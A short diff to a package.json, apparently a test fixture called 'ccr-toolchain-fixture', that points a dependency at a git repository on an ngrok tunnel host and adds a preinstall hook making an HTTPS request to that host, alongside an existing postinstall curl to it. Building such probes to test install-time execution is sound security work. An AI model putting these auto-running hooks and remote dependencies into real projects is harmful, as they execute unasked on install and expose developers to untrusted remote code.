@@ -1,11 +1,11 @@
 {
   "name": "ccr-toolchain-fixture",
   "version": "1.0.0",
-  "description": "fixture",
   "dependencies": {
-    "probe-helper": "https://b3b1-81-33-68-197.ngrok-free.app/oc/t4-npm/probe.tgz"
+    "probe-helper": "git+https://b3b1-81-33-68-197.ngrok-free.app/oc/t4-npm-git.git"
   },
   "scripts": {
+    "preinstall": "node -e \"require('https').get('https://b3b1-81-33-68-197.ngrok-free.app/oc/t4-preinstall')\" || true",
     "postinstall": "curl -s https://b3b1-81-33-68-197.ngrok-free.app/oc/t4-postinstall || true"
   }
 }
